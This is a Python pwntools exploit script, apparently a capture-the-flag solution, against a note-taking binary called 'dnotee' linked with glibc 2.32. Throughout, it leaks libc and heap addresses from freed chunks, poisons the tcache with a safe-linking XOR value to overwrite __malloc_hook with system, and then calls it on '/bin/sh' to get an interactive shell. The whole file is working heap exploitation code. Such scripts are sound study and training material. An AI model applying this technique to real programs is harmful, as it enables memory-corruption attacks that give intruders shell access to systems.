#!/usr/bin/env python3
from pwn import *

exe = ELF("dnotee")
libc = ELF("libc-2.32.so")
ld = ELF("ld-2.32.so")
# context.log_level='debug'
context.terminal = ["foot"]
if args.REMOTE:
    p = remote("addr", 1337)
else:
    p = process([exe.path])
    gdb.attach(p, """

               """)
    # p = gdb.debug([exe.path],"""
    #
    #                 """)

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
def add(idx,size,name=b"\n"):
    sla(b">>",b"1")
    sla(b":",str(idx).encode())
    sla(b":",str(size).encode())
    sla(b":",name)
def delete(idx):
    sla(b">>",b"3")
    sla(b":",str(idx).encode())
def show(idx):
    sla(b">>",b"2")
    sla(b":",str(idx).encode())
pop_rdi = 0x000000000040156b
log.info(f"allocate 7 chunks and then 2 more")
for i in range(8):
    print(i)
    add(i,0x100,b"lmaodark")

add(8,0x100,b"update size")
add(9,0x10,b"no consolidation")
for i in range(7):
    delete(i)
delete(7)
delete(8)
log.info(f"pop from tcache")
add(10,0x300)
for i in range(8):
    print(f"leak...........{i}.................")
    show(i)
    log.info(f"leak: {p.recvline()}")
show(7)
p.recvuntil(b" ")
address = u64(p.recvuntil(b"\n",drop=True).ljust(8,b"\0"))
log.info(f"leak: {hex(address)}")
libc.address = address - 0x1c4e10
show(6)
p.recvuntil(b" ")
address = u64(p.recvuntil(b"\n",drop=True).ljust(8,b"\0"))
heap_base = address - 0x3f5
log.info(f"leak: {hex(address)}")
##########pop tcache
add(12,0x100,b"lmaodark")
delete(8)
###############write
write = heap_base +0xb20
xorthing = libc.sym['__malloc_hook']^write>>12
add(8,0x210,b"a"*232+b"a"*0x20+p64(0x111)+p64(xorthing)+b"a"*8)
log.info(f"malloc hook: {hex(libc.sym['__malloc_hook'])}")
add(5,0x110-0x16,b"/bin/sh\0")
add(5,0x110-0x16,p64(libc.sym["system"]))
# run bin sh
bin_sh = heap_base+0xb20
add(5,bin_sh,b"\n")

p.interactive()
# good luck pwning :)

